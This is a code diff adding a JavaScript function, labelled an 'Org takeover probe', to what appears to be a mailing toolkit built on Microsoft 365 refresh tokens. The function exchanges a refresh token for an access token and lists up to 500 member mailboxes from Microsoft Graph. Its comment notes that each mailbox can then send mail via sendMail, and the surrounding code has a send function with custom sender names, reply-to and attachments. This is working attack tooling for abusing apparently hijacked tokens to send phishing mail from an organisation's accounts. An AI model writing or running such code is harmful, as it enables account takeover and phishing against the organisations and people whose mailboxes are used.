@@ -617,6 +617,26 @@ export async function msRtMailboxInfo(clientId, refreshToken, tenant = 'common')
   return { email, displayName: data.displayName || email, token };
 }
 
+// Org takeover probe — a delegated token that can read the directory is an
+// admin-grade credential; every member mailbox it enumerates is sendable via
+// /users/{mailbox}/sendMail when the token's consent covers it.
+export async function msRtListOrgMailboxes(clientId, refreshToken, tenant = 'common') {
+  const token = await msRtAccessToken(clientId, refreshToken, tenant);
+  const users = [];
+  let url = "https://graph.microsoft.com/v1.0/users?$select=mail,userPrincipalName,displayName,userType&$filter=userType eq 'Member'&$top=100";
+  while (url && users.length < 500) {
+    const res = await fetch(url, { headers: { authorization: `Bearer ${token}` }, signal: AbortSignal.timeout(15000) });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(`org directory read failed ${res.status}: ${data.error?.message || res.statusText}`);
+    for (const u of data.value || []) {
+      const email = u.mail || u.userPrincipalName || '';
+      if (email.includes('@')) users.push({ email, displayName: u.displayName || email });
+    }
+    url = data['@odata.nextLink'] || null;
+  }
+  return users;
+}
+
 export async function msRtSendMail({ token, sender, message, recipient, fromName, replyTo, attachments, settings }) {
   const toName = [recipient.firstName, recipient.lastName].filter(Boolean).join(' ');
   const addr = { emailAddress: { name: toName, address: recipient.email } };
